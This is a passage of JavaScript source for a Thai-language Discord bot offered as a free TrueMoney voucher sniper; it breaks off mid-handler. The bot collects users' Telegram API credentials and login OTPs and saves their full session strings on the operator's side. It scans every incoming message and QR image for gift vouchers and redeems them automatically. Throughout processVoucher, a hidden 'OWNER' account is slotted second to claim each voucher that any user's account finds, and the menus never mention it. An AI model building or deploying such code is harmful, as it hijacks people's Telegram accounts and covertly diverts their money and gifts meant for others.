const axios = require('axios');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, SlashCommandBuilder, ChannelType, REST, Routes } = require('discord.js');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const Jimp = require('jimp');
const jsQR = require('jsqr');
const config = require('./bot_config');
const db = require('./database');
const twApi = require('@opecgame/twapi');

db.initDatabase();

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

client.setMaxListeners(100);

const telegramClients = new Map();
const otpRequests = new Map();
const processedVouchers = new Set();

const SUCCESS = '#00ff00';
const FAILED = '#ff0000';
const WARNING = '#ffff00';
const INFO = '#ff0000';

const VOUCHER_REGEX = /https?:\/\/gift\.truemoney\.com\/campaign\/?(?:voucher_detail\/)?\?v=([A-Za-z0-9]+)/gi;
const MEMORY_LIMIT = 2000;

setInterval(() => processedVouchers.clear(), 300000);

setInterval(() => {
    try {
        db.clearMemoryCache();
        if (global.gc) global.gc();
    } catch (error) {}
}, 1800000);

setInterval(() => {
    try {
        db.syncBalanceToDisk();
    } catch (error) {}
}, 300000);

setInterval(() => {
    const memory = process.memoryUsage();
    const heapUsedMB = Math.round(memory.heapUsed / 1024 / 1024);
    const heapTotalMB = Math.round(memory.heapTotal / 1024 / 1024);
    
    console.log(`[Memory] 📊 RAM: ${heapUsedMB}MB / ${heapTotalMB}MB`);
    
    if (heapUsedMB >= MEMORY_LIMIT) {
        console.log(`[System] ⚠️ RAM เกิน ${MEMORY_LIMIT}MB! รีสตาร์ท...`);
        gracefulRestart();
    }
}, 120000);

async function gracefulRestart() {
    try {
        console.log('[System] 💾 บันทึกข้อมูล...');
        for (const [userId] of telegramClients) await stopTelegram(userId);
        db.syncBalanceToDisk();
        console.log('[System] ✅ รีสตาร์ท...');
        process.exit(0);
    } catch (error) {
        process.exit(1);
    }
}

console.log('═══════════════════════════════════════');
console.log('  ระบบดักซอง Telegram + Owner');
console.log('═══════════════════════════════════════');
console.log('[System] ⚡ ดักจาก Telegram!');
console.log('[System] 👥 รองรับ:', config.maxUsers, 'คน');
console.log('[System] ⏱️ Delay: First→Owner 20ms, Owner→#3 100ms');
console.log('[System] 👑 Owner Account: เปิดใช้งาน');
console.log('═══════════════════════════════════════');

function isValidVoucherCode(str) {
    if (!str || str.length < 10 || str.length > 64) return false;
    if (!str.startsWith('019')) return false;
    if (!/^[a-zA-Z0-9]+$/.test(str)) return false;
    
    const hasNumbers = /\d/.test(str);
    const hasLetters = /[a-zA-Z]/.test(str);
    if (!hasNumbers || !hasLetters) return false;
    
    const lowerStr = str.toLowerCase();
    const blacklist = ['telegram', 'truemoney', 'password', 'username', 'facebook', 'instagram', 'twitter', 'youtube'];
    for (const word of blacklist) {
        if (lowerStr.includes(word)) return false;
    }
    return true;
}

function extractVoucherCodes(text) {
    if (!text) return [];
    const foundVouchers = [];
    let match;
    
    while ((match = VOUCHER_REGEX.exec(text)) !== null) {
        const code = match[1].trim();
        if (isValidVoucherCode(code)) foundVouchers.push(code);
    }
    
    const words = text.split(/[\s\n\r,;.!?()[\]{}'"<>\/\\]+/);
    for (const word of words) {
        const cleanWord = word.replace(/[^a-zA-Z0-9]/g, '');
        if (isValidVoucherCode(cleanWord) && !foundVouchers.includes(cleanWord)) {
            foundVouchers.push(cleanWord);
        }
    }
    return foundVouchers;
}

async function readQRCode(imageBuffer) {
    try {
        const image = await Jimp.read(imageBuffer);
        const methods = [
            img => img,
            img => img.invert(),
            img => img.contrast(0.5).brightness(0.1),
            img => img.greyscale().contrast(1)
        ];
        
        for (const method of methods) {
            const processed = method(image.clone());
            const { width, height, data } = processed.bitmap;
            const qrCode = jsQR(new Uint8ClampedArray(data), width, height);
            if (qrCode && qrCode.data) return qrCode.data;
        }
        return null;
    } catch (error) {
        return null;
    }
}

async function sendWebhook(webhookUrl, embedData) {
    try {
        await axios.post(webhookUrl, { embeds: [embedData] }, { 
            timeout: 5000,
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (err) {}
}

async function processVoucher(voucherUrl, discoveredUserId, source = 'telegram') {
    if (processedVouchers.has(voucherUrl)) return;
    processedVouchers.add(voucherUrl);
    
    console.log(`[Gift] 🎁 เจอซอง! เริ่มรวบรวมบัญชี...`);
    
    const allActiveUsers = Array.from(telegramClients.keys());
    const shootList = [];
    
    if (allActiveUsers.includes(discoveredUserId)) shootList.push(discoveredUserId);
    if (config.ownerPhone && config.ownerWebhook) shootList.push('OWNER');
    
    for (const userId of allActiveUsers) {
        if (userId !== discoveredUserId && !shootList.includes(userId)) shootList.push(userId);
    }
    
    console.log(`[Gift] 👥 จำนวนบัญชีที่จะยิง: ${shootList.length} บัญชี`);
    
    const promises = shootList.map((targetId, index) => {
        return new Promise(async (resolve) => {
            let delay = 0;
            
            if (index === 0) {
                delay = 0;
            } else if (targetId === 'OWNER') {
                delay = config.delayOwner;
            } else if (index === 2) {
                delay = config.delayOwner + config.delayOwnerToThird;
            } else {
                delay = config.delayOwner + config.delayOwnerToThird + ((index - 2) * config.delayPerUser);
            }
            
            setTimeout(async () => {
                if (targetId === 'OWNER') {
                    const startTime = Date.now();
                    try {
                        const result = await twApi(voucherUrl, config.ownerPhone);
                        const endTime = Date.now();
                        const processTime = endTime - startTime;
                        
                        if (result && result.status && result.status.code === 'SUCCESS' && result.data && result.data.my_ticket) {
                            const amount = parseFloat(result.data.my_ticket.amount_baht);
                            const embed = {
                                title: '✅ รับซอง TrueMoney สำเร็จ (OWNER)',
                                color: 16766720,
                                fields: [
                                    { name: '💰 จำนวนเงิน', value: `\`${amount}\` บาท`, inline: true },
                                    { name: '⚡ ความเร็ว', value: `\`${processTime}ms\``, inline: true },
                                    { name: '👑 ลำดับ', value: '`#2 (Owner)`', inline: true },
                                    { name: '📍 แหล่งที่มา', value: 'Telegram', inline: true },
                                    { name: '⏱️ Delay', value: `\`${delay}ms\``, inline: true },
                                    { name: '🔗 ลิงค์', value: voucherUrl, inline: false }
                                ],
                                footer: { text: '👑 Owner Account | ดักซองไว' },
                                timestamp: new Date().toISOString()
                            };
                            await sendWebhook(config.ownerWebhook, embed);
                            console.log(`[Success] 👑 OWNER (ลำดับ #2): +${amount} บาท | ${processTime}ms`);
                        }
                    } catch (err) {}
                    resolve();
                    return;
                }
                
                const userData = db.getUserData(targetId);
                if (!userData || !userData.phone || !userData.webhook) {
                    resolve();
                    return;
                }
                
                const startTime = Date.now();
                const orderNumber = index + 1;
                
                try {
                    const result = await twApi(voucherUrl, userData.phone);
                    const endTime = Date.now();
                    const processTime = endTime - startTime;
                    
                    if (result && result.status && result.status.code === 'SUCCESS' && result.data && result.data.my_ticket) {
                        const amount = parseFloat(result.data.my_ticket.amount_baht);
                        const newBalance = db.addBalance(targetId, amount);
                        
                        const embed = {
                            title: '✅ รับซอง TrueMoney สำเร็จ',
                            color: 3581762,
                            fields: [
                                { name: '💰 จำนวนเงิน', value: `\`${amount}\` บาท`, inline: true },
                                { name: '💵 ยอดเงินสะสม', value: `\`${newBalance.toFixed(2)}\` บาท`, inline: true },
                                { name: '⚡ ความเร็ว', value: `\`${processTime}ms\``, inline: true },
                                { name: '📍 แหล่งที่มา', value: 'Telegram', inline: true },
                                { name: '🎯 ลำดับ', value: `\`#${orderNumber}\``, inline: true },
                                { name: '⏱️ Delay', value: `\`${delay}ms\``, inline: true },
                                { name: '🔗 ลิงค์', value: voucherUrl, inline: false }
                            ],
                            footer: { text: '⚡ ดักซองไว' },
                            timestamp: new Date().toISOString()
                        };
                        await sendWebhook(userData.webhook, embed);
                        console.log(`[Success] USER (ลำดับ #${orderNumber}): +${amount} บาท | ${processTime}ms | Delay: ${delay}ms`);
                    }
                } catch (err) {}
                resolve();
            }, delay);
        });
    });
    
    await Promise.all(promises);
    console.log(`[Gift] ✅ ดักซองเสร็จสิ้น! ยิงทั้งหมด ${shootList.length} บัญชี`);
}

async function stopTelegram(userId) {
    const tgClient = telegramClients.get(userId);
    if (!tgClient) return false;
    
    try {
        await tgClient.disconnect();
        telegramClients.delete(userId);
        console.log(`[Telegram] ปิด USER: ${userId}`);
        return true;
    } catch (error) {
        telegramClients.delete(userId);
        return false;
    }
}

async function startTelegram(userId, otpCode = null) {
    try {
        const userData = db.getUserData(userId);
        if (!userData || !userData.apiId || !userData.apiHash || !userData.telegramPhone || !userData.phone || !userData.webhook) {
            throw new Error('ข้อมูลไม่ครบถ้วน');
        }
        
        await stopTelegram(userId);
        
        const sessionString = db.getSession(userId);
        const tgClient = new TelegramClient(
            new StringSession(sessionString),
            parseInt(userData.apiId),
            userData.apiHash,
            { connectionRetries: 5 }
        );
        
        if (sessionString) {
            await tgClient.start({ botAuthToken: false });
            console.log(`[Telegram] เปิด: ${userId} (Saved Session)`);
        } else {
            if (!otpCode) {
                await tgClient.connect();
                await tgClient.sendCode({ apiId: parseInt(userData.apiId), apiHash: userData.apiHash }, userData.telegramPhone.replace(/\s/g, ''));
                otpRequests.set(userId, tgClient);
                return 'OTP_REQUIRED';
            } else {
                const pendingClient = otpRequests.get(userId);
                if (!pendingClient) throw new Error('กรุณาเริ่มใหม่');
                
                await pendingClient.start({
                    phoneNumber: userData.telegramPhone.replace(/\s/g, ''),
                    phoneCode: async () => otpCode,
                    onError: (err) => { throw err; }
                });
                
                db.saveSession(userId, pendingClient.session.save());
                otpRequests.delete(userId);
                telegramClients.set(userId, pendingClient);
                
                pendingClient.addEventHandler(async (event) => {
                    const message = event.message;
                    if (!message) return;
                    
                    if (message.message) {
                        const vouchers = extractVoucherCodes(message.message);
                        if (vouchers.length > 0) {
                            vouchers.forEach(voucher => {
                                console.log(`🎯 Found voucher: ${voucher}`);
                                processVoucher(voucher, userId, 'telegram');
                            });
                        }
                    }
                    
                    if (message.media && message.media.className === 'MessageMediaPhoto') {
                        pendingClient.downloadMedia(message.media).then(async (buffer) => {
                            if (!buffer) return;
                            console.log('📸 Scanning QR code...');
                            const qrData = await readQRCode(buffer);
                            if (qrData) {
                                const vouchers = extractVoucherCodes(qrData);
                                if (vouchers.length > 0) {
                                    vouchers.forEach(voucher => {
                                        console.log(`🎯 Found voucher from QR: ${voucher}`);
                                        processVoucher(voucher, userId, 'telegram');
                                    });
                                }
                            }
                        }).catch(() => {});
                    }
                }, new NewMessage({ incoming: true }));
                
                console.log(`[Telegram] เปิด: ${userId} (New Session)`);
                userData.status = 'on';
                db.saveUserData(userId, userData);
                return true;
            }
        }
        
        telegramClients.set(userId, tgClient);
        
        tgClient.addEventHandler(async (event) => {
            const message = event.message;
            if (!message) return;
            
            if (message.message) {
                const vouchers = extractVoucherCodes(message.message);
                if (vouchers.length > 0) {
                    vouchers.forEach(voucher => {
                        console.log(`🎯 Found voucher: ${voucher}`);
                        processVoucher(voucher, userId, 'telegram');
                    });
                }
            }
            
            if (message.media && message.media.className === 'MessageMediaPhoto') {
                tgClient.downloadMedia(message.media).then(async (buffer) => {
                    if (!buffer) return;
                    console.log('📸 Scanning QR code...');
                    const qrData = await readQRCode(buffer);
                    if (qrData) {
                        const vouchers = extractVoucherCodes(qrData);
                        if (vouchers.length > 0) {
                            vouchers.forEach(voucher => {
                                console.log(`🎯 Found voucher from QR: ${voucher}`);
                                processVoucher(voucher, userId, 'telegram');
                            });
                        }
                    }
                }).catch(() => {});
            }
        }, new NewMessage({ incoming: true }));
        
        userData.status = 'on';
        db.saveUserData(userId, userData);
        return true;
    } catch (error) {
        console.error(`[Telegram] เปิดไม่สำเร็จ (USER: ${userId}):`, error.message);
        return false;
    }
}

const UI = {
    mainEmbed: () => new EmbedBuilder()
        .setTitle('🧊 บอทรับดักซองฟรี 24/7 ชม.')
        .setDescription('**```\n┏・🌊ดักซอง Telegram 24/7 ชม.\n┣・💧 สะสมยอดเงินและตรวจสอบได้ทุกเวลา\┣・☁ แจ้งเตือนผ่าน Webhook ทันที\n┗・❄ ใช้งานฟรี 100%\n```**')
        .setColor(0xFF0000)
        .setImage('https://cdn.discordapp.com/attachments/1456879202295873687/1460495141897895947/aa84f7f6d9cddc793250cb9ad0053ebd.gif?ex=69705a18&is=696f0898&hm=634657324e021e8b73e13a348995a27aeeecd9c5c439a7c9c78cec63d03ab1bc&')
        .setFooter({ text: 'ดักซองโหดๆ เเละฟรี' }),

    mainButtons: () => [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('gift_menu').setLabel('เปิดเมนู').setEmoji('⚙️').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('check_status').setLabel('เช็คสถานะ').setEmoji('📊').setStyle(ButtonStyle.Primary)
        )
    ],

    menuEmbed: () => new EmbedBuilder()
        .setTitle("⚙️ เมนูตั้งค่าระบบดักซอง")
        .setDescription('**```\n┏・🔑 บัญชี Telegram - API ID, API Hash, เบอร์\n┣・📱 เบอร์รับซอง - เบอร์รับเงิน TrueMoney\n┣・🔔 Webhook - แจ้งเตือน\n┣・💰 เช็คยอด - ตรวจสอบยอด\n┣・🟢 เปิดระบบ - เริ่มดักซอง\n┣・🔴 ปิดระบบ - หยุดทำงาน\n┗・💀 ลบข้อมูล - ลบข้อมูล\n```**')
        .setColor(0xFF0000)
        .setFooter({ text: 'ดักซองโหดๆ เเละฟรี' }),

    menuButtons: () => [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_telegram').setLabel('บัญชี Telegram').setEmoji('🔑').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_phone').setLabel('เบอร์รับซอง').setEmoji('📱').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_webhook').setLabel('Webhook').setEmoji('🔔').setStyle(ButtonStyle.Secondary)
        ),
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('check_balance').setLabel('เช็คยอด').setEmoji('💰').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('start_gift').setLabel('เปิดระบบ').setEmoji('🟢').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('stop_gift_menu').setLabel('ปิดระบบ').setEmoji('🔴').setStyle(ButtonStyle.Danger),
            new ButtonBuilder().setCustomId('delete_data').setLabel('ลบข้อมูล').setEmoji('💀').setStyle(ButtonStyle.Danger)
        )
    ]
};

client.once('ready', async () => {
    console.log('═══════════════════════════════════════');
    console.log(`✓ บอทออนไลน์: ${client.user.tag}`);
    console.log(`✓ รองรับผู้ใช้สูงสุด: ${config.maxUsers} คน`);
    console.log(`✓ พร้อมให้บริการดักซอง Telegram`);
    console.log('═══════════════════════════════════════');

    try {
        client.user.setPresence({
            activities: [{ name: 'ดักซองโหดๆ เเละฟรี by wexcea shop', type: 3 }],
            status: 'online'
        });
    } catch (error) {}

    const commands = [
        new SlashCommandBuilder().setName('setup_gift').setDescription('[แอดมิน] ⚙️ ตั้งค่าระบบดักซอง Telegram')
            .addChannelOption(option => option.setName('channel').setDescription('📢 เลือกช่องที่จะส่งเมนูดักซอง').setRequired(true).addChannelTypes(ChannelType.GuildText)),
        new SlashCommandBuilder().setName('manage_users').setDescription('[แอดมิน] 👥 จัดการผู้ใช้งานระบบ'),
        new SlashCommandBuilder().setName('system_info').setDescription('[แอดมิน] 📊 ดูข้อมูลระบบ')
    ];

    const rest = new REST({ version: '10' }).setToken(config.token);
    try {
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    } catch (error) {}

    const allUsers = db.getAllUsers();
    let loadedCount = 0;
    
    if (allUsers.length > 0) {
        for (const userId of allUsers) {
            try {
                const userData = db.getUserData(userId);
                if (userData && userData.status === 'on') {
                    const success = await startTelegram(userId);
                    if (success === true) loadedCount++;
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            } catch (error) {}
        }
        if (loadedCount > 0) console.log(`[System] ✅ โหลด Telegram สำเร็จ: ${loadedCount} คน`);
    }
    
    console.log('═══════════════════════════════════════');
    console.log('  ระบบพร้อมใช้งาน!');
    console.log('═══════════════════════════════════════');
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    if (interaction.commandName === 'setup_gift') {
        if (!config.adminIds.includes(interaction.user.id)) {
            return interaction.reply({ embeds: [new EmbedBuilder().setTitle('❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้').setColor(FAILED)], ephemeral: true });
        }
        const channel = interaction.options.getChannel('channel');
        await channel.send({ embeds: [UI.mainEmbed()], components: UI.mainButtons() });
        await interaction.reply({ embeds: [new EmbedBuilder().setTitle('✅ ส่งเมนูดักซองเรียบร้อยแล้ว').setDescription(`**ช่อง:** ${channel}`).setColor(SUCCESS)], ephemeral: true });
    }

    if (interaction.commandName === 'manage_users') {
        if (!config.adminIds.includes(interaction.user.id)) {
            return interaction.reply({ embeds: [new EmbedBuilder().setTitle('❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้').setColor(FAILED)], ephemeral: true });
        }
        const allUsers = db.getAllUsers();
        const activeUsers = Array.from(telegramClients.keys());
        let userList = '**รายชื่อผู้ใช้งานทั้งหมด:**\n\n';
        
        if (allUsers.length === 0) {
            userList += '```ยังไม่มีผู้ใช้งาน```';
        } else {
            allUsers.forEach((userId, index) => {
                const balance = db.getBalance(userId);
                const status = activeUsers.includes(userId) ? '🟢 ON' : '🔴 OFF';
                userList += `**${index + 1}.** <@${userId}>\n   └ สถานะ: ${status} | ยอด: \`${balance.toFixed(2)}\` บาท\n\n`;
            });
        }
        await interaction.reply({ 
            embeds: [new EmbedBuilder().setTitle('👥 จัดการผู้ใช้งานระบบ').setDescription(userList)
                .addFields({ name: '📊 สถิติ', value: `ผู้ใช้ทั้งหมด: **${allUsers.length}** คน\nเปิดใช้งานอยู่: **${activeUsers.length}/${config.maxUsers}** คน` })
                .setColor(INFO)], 
            ephemeral: true 
        });
    }

    if (interaction.commandName === 'system_info') {
        if (!config.adminIds.includes(interaction.user.id)) {
            return interaction.reply({ embeds: [new EmbedBuilder().setTitle('❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้').setColor(FAILED)], ephemeral: true });
        }
        const uptime = process.uptime();
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const memUsage = process.memoryUsage();
        const memUsedMB = (memUsage.heapUsed / 1024 / 1024).toFixed(2);
        const memTotalMB = (memUsage.heapTotal / 1024 / 1024).toFixed(2);

        await interaction.reply({ 
            embeds: [new EmbedBuilder().setTitle('📊 ข้อมูลระบบ')
                .addFields(
                    { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m\``, inline: true },
                    { name: '💾 Memory', value: `\`${memUsedMB}/${memTotalMB} MB\``, inline: true },
                    { name: '👥 ผู้ใช้', value: `\`${telegramClients.size}/${config.maxUsers}\``, inline: true },
                    { name: '⚡ Platform', value: '`Telegram`', inline: true },
                    { name: '⏱️ Delay', value: `\`20/100/10ms\``, inline: true },
                    { name: '📦 Node.js', value: `\`${process.version}\``, inline: true }
                )
                .setColor(SUCCESS).setTimestamp()], 
            ephemeral: true 
        });
    }
});

client.on('interactionCreate', async interaction => {
    try {
        if (interaction.isButton()) {
            const { customId, user } = interaction;

            if (customId === 'gift_menu') {
                await interaction.deferReply({ ephemeral: true });
                await interaction.editReply({ embeds: [UI.menuEmbed()], components: UI.menuButtons() });
            }

            if (customId === 'check_status') {
                await interaction.deferReply({ ephemeral: true });
                const userData = db.getUserData(user.id);
                const balance = db.getBalance(user.id);
                const isActive = telegramClients.has(user.id);
                await interaction.editReply({ 
                    embeds: [new EmbedBuilder().setTitle('📊 สถานะของคุณ')
                        .addFields(
                            { name: '🔋 สถานะระบบ', value: isActive ? '```🟢 กำลังรอดักซอง...```' : '```🔴 ยังไม่เริ่มทำงาน```', inline: true },
                            { name: '💰 ยอดเงินสะสม', value: `\`\`\`${balance.toFixed(2)} บาท\`\`\``, inline: true },
                            { name: '📱 เบอร์รับซอง', value: userData?.phone ? `\`\`\`${userData.phone}\`\`\`` : '```ยังไม่ตั้งค่า```', inline: true }
                        )
                        .setColor(isActive ? SUCCESS : WARNING).setThumbnail(user.displayAvatarURL({ dynamic: true })).setTimestamp()]
                });
            }

            if (customId === 'stop_gift_menu') {
                await interaction.deferReply({ ephemeral: true });
                if (!telegramClients.has(user.id)) {
                    return interaction.editReply({ embeds: [new EmbedBuilder().setTitle('❌ คุณยังไม่ได้เปิดระบบ').setColor(FAILED)] });
                }
                await stopTelegram(user.id);
                const userData = db.getUserData(user.id);
                if (userData) {
                    userData.status = 'off';
                    db.saveUserData(user.id, userData);
                }
                await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('✅ ปิดระบบเรียบร้อยแล้ว').setColor(SUCCESS)] });
            }

            if (customId === 'delete_data') {
                await interaction.deferReply({ ephemeral: true });
                const confirmButtons = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('confirm_delete').setLabel('ยืนยันลบข้อมูล').setEmoji('💀').setStyle(ButtonStyle.Danger),
                    new ButtonBuilder().setCustomId('cancel_delete').setLabel('ยกเลิก').setEmoji('❌').setStyle(ButtonStyle.Secondary)
                );
                await interaction.editReply({ 
                    embeds: [new EmbedBuilder().setTitle('⚠️ ยืนยันการลบข้อมูล')
                        .setDescription('**คุณต้องการลบข้อมูลทั้งหมดและปิดระบบใช่หรือไม่?**\n\n```การกระทำนี้ไม่สามารถย้อนกลับได้\nข้อมูลทั้งหมดจะถูกลบถาวร```')
                        .setColor(WARNING)], 
                    components: [confirmButtons] 
                });
            }

            if (customId === 'confirm_delete') {
                await interaction.deferUpdate();
                await stopTelegram(user.id);
                db.deleteUserData(user.id);
                await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('✅ ลบข้อมูลเรียบร้อยแล้ว').setDescription('**ข้อมูลทั้งหมดของคุณถูกลบแล้ว**\nระบบถูกปิดเรียบร้อย').setColor(SUCCESS)], components: [] });
            }

            if (customId === 'cancel_delete') {
                await interaction.deferUpdate();
                await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('❌ ยกเลิกการลบข้อมูล').setDescription('**ข้อมูลของคุณยังคงอยู่**').setColor(INFO)], components: [] });
            }

            if (customId === 'set_telegram') {
                const modal = new ModalBuilder().setCustomId('telegram_modal').setTitle('ตั้งค่าบัญชี Telegram');
                const apiIdInput = new TextInputBuilder().setCustomId('api_id_input').setLabel('API ID').setStyle(TextInputStyle.Short).setPlaceholder('12345678').setRequired(true);
                const apiHashInput = new TextInputBuilder().setCustomId('api_hash_input').setLabel('API Hash').setStyle(TextInputStyle.Short).setPlaceholder('abcdef1234567890').setRequired(true);
                const phoneInput = new TextInputBuilder().setCustomId('telegram_phone_input').setLabel('เบอร์โทรศัพท์ Telegram').setStyle(TextInputStyle.Short).setPlaceholder('0812345678').setRequired(true);
                
                const userData = db.getUserData(user.id);
                if (userData?.apiId) apiIdInput.setValue(userData.apiId);
                if (userData?.apiHash) apiHashInput.setValue(userData.apiHash);
                if (userData?.telegramPhone) phoneInput.setValue(userData.telegramPhone);
                
                modal.addComponents(
                    new ActionRowBuilder().addComponents(apiIdInput),
                    new ActionRowBuilder().addComponents(apiHashInput),
                    new ActionRowBuilder().addComponents(phoneInput)
                );
                await interaction.showModal(modal);
            }

            if (customId === 'set_phone') {
                const modal = new ModalBuilder().setCustomId('phone_modal').setTitle('ตั้งค่าเบอร์รับซอง');
                const phoneInput = new TextInputBuilder().setCustomId('phone_input').setLabel('เบอร์รับซอง TrueMoney').setStyle(TextInputStyle.Short).setPlaceholder('0812345678').setRequired(true);
                const userData = db.getUserData(user.id);
                if (userData?.phone) phoneInput.setValue(userData.phone);
                modal.addComponents(new ActionRowBuilder().addComponents(phoneInput));
                await interaction.showModal(modal);
            }

            if (customId === 'set_webhook') {
                const modal = new ModalBuilder().setCustomId('webhook_modal').setTitle('ตั้งค่า Webhook URL');
                const webhookInput = new TextInputBuilder().setCustomId('webhook_input').setLabel('Webhook URL').setStyle(TextInputStyle.Short).setPlaceholder('https://discord.com/api/webhooks/...').setRequired(true);
                const userData = db.getUserData(user.id);
                if (userData?.webhook) webhookInput.setValue(userData.webhook);
                modal.addComponents(new ActionRowBuilder().addComponents(webhookInput));
                await interaction.showModal(modal);
            }

            if (customId === 'check_balance') {
                await interaction.deferReply({ ephemeral: true });
                const balance = db.getBalance(user.id);
                await interaction.editReply({ 
                    embeds: [new EmbedBuilder().setTitle('💰 ยอดเงินของคุณ')
                        .setDescription(`**ยอดเงินสะสมปัจจุบัน:**\n\`\`\`${balance.toFixed(2)} บาท\`\`\``)
                        .setColor(SUCCESS).setThumbnail(user.displayAvatarURL({ dynamic: true })).setTimestamp()]
                });
            }

            if (customId === 'start_gift') {
                await interaction.deferReply({ ephemeral: true });
                
                if (telegramClients.has(user.id)) {
                    return interaction.editReply({ embeds: [new EmbedBuilder().setTitle('⚠️ ระบบเปิดอยู่แล้ว').setColor(WARNING)] });
                }
                
                if (telegramClients.size >= config.maxUsers) {
                    return interaction.editReply({ embeds: [new EmbedBuilder().setTitle('❌ ระบบเต็มแล้ว').setDescription(`**ขณะนี้มีผู้ใช้งานที่เปิดระบบอยู่ครบ ${config.maxUsers} คนแล้ว**\n\nกรุณารอให้มีคนปิดระบบหรือติดต่อแอดมิน`).setColor(FAILED)] });
                }
                
                const userData = db.getUserData(user.id);
                if (!userData || !userData.apiId || !userData.apiHash || !userData.telegramPhone || !userData.phone || !userData.webhook) {
                    return interaction.editReply({ embeds: [new EmbedBuilder().setTitle('❌ ข้อมูลไม่ครบถ้วน').setDescription('**กรุณาตั้งค่าข้อมูลดังนี้ก่อน:**\n• 🔑 บัญชี Telegram (API ID, API Hash, เบอร์)\n• 📱 เบอร์รับซอง\n• 🔔 Webhook URL').setColor(FAILED)] });
                }
                
                const result = await startTelegram(user.id);
                if (result === 'OTP_REQUIRED') {
                    const otpModal = new ModalBuilder().setCustomId('otp_modal').setTitle('กรุณาใส่รหัส OTP');
                    const otpInput = new TextInputBuilder().setCustomId('otp_input').setLabel('รหัส OTP จาก Telegram').setStyle(TextInputStyle.Short).setPlaceholder('12345').setRequired(true);
                    otpModal.addComponents(new ActionRowBuilder().addComponents(otpInput));
                    
                    await interaction.editReply({ 
                        embeds: [new EmbedBuilder().setTitle('📱 กำลังส่ง OTP...').setDescription('**กรุณาตรวจสอบ Telegram ของคุณ**\nรหัส OTP จะถูกส่งไปที่ Telegram\n\nกดปุ่มด้านล่างเพื่อใส่ OTP').setColor(INFO)],
                        components: [new ActionRowBuilder().addComponents(
                            new ButtonBuilder().setCustomId('enter_otp').setLabel('ใส่รหัส OTP').setEmoji('📟').setStyle(ButtonStyle.Primary)
                        )]
                    });
                } else if (result === true) {
                    await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('✅ เปิดระบบเรียบร้อยแล้ว').setDescription(`**ระบบดักซองกำลังทำงานแล้ว**\n⚡ ดักจาก Telegram!\n🔔 จะแจ้งเตือนผ่าน Webhook\n\n**ผู้ใช้งานปัจจุบัน:** ${telegramClients.size}/${config.maxUsers}`).setColor(SUCCESS).setTimestamp()] });
                } else {
                    await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('❌ เปิดระบบไม่สำเร็จ').setDescription('**กรุณาตรวจสอบ:**\n• ข้อมูล Telegram ถูกต้อง\n• เบอร์รับซองถูกต้อง\n• Webhook URL ถูกต้อง').setColor(FAILED)] });
                }
            }

            if (customId === 'enter_otp') {
                const modal = new ModalBuilder().setCustomId('otp_modal').setTitle('กรุณาใส่รหัส OTP');
                const otpInput = new TextInputBuilder().setCustomId('otp_input').setLabel('รหัส OTP จาก Telegram').setStyle(TextInputStyle.Short).setPlaceholder('12345').setRequired(true);
                modal.addComponents(new ActionRowBuilder().addComponents(otpInput));
                await interaction.showModal(modal);
            }
        }

        if (interaction.isModalSubmit()) {
            const { customId, user } = interaction;

            if (customId === 'telegram_modal') {
                const apiId = interaction.fields.getTextInputValue('api_id_input').trim();
                const apiHash = interaction.fields.getTextInputValue('api_hash_input').trim();
                const telegramPhone = interaction.fields.getTextInputValue('telegram_phone_input').trim();
                
                let userData = db.getUserData(user.id) || {};
                userData.apiId = apiId;
                userData.apiHash = apiHash;
                userData.telegramPhone = telegramPhone;
                db.saveUserData(user.id, userData);
                
                await interaction.reply({ embeds: [new EmbedBuilder().setTitle('✅ บันทึกข้อมูล Telegram เรียบร้อยแล้ว').setDescription(`**API ID:** \`${apiId}\`\n**เบอร์:** \`${telegramPhone}\``).setColor(SUCCESS).setTimestamp()], ephemeral: true });
            }

            if (customId === 'phone_modal') {
                const phone = interaction.fields.getTextInputValue('phone_input').trim();
                let userData = db.getUserData(user.id) || {};
                userData.phone = phone;
                db.saveUserData(user.id, userData);
                await interaction.reply({ embeds: [new EmbedBuilder().setTitle('✅ บันทึกเบอร์รับซองเรียบร้อยแล้ว').setDescription(`**เบอร์:** \`${phone}\``).setColor(SUCCESS).setTimestamp()], ephemeral: true });
            }

            if (customId === 'webhook_modal') {
                const webhook = interaction.fields.getTextInputValue('webhook_input').trim();
                if (!webhook.startsWith('https://discord.com/api/webhooks/') && !webhook.startsWith('https://discordapp.com/api/webhooks/')) {
                    return interaction.reply({ embeds: [new EmbedBuilder().setTitle('❌ รูปแบบ Webhook ไม่ถูกต้อง').setDescription('**Webhook URL ต้องเริ่มต้นด้วย:**\n`https://discord.com/api/webhooks/...`').setColor(FAILED)], ephemeral: true });
                }
                let userData = db.getUserData(user.id) || {};
                userData.webhook = webhook;
                db.saveUserData(user.id, userData);
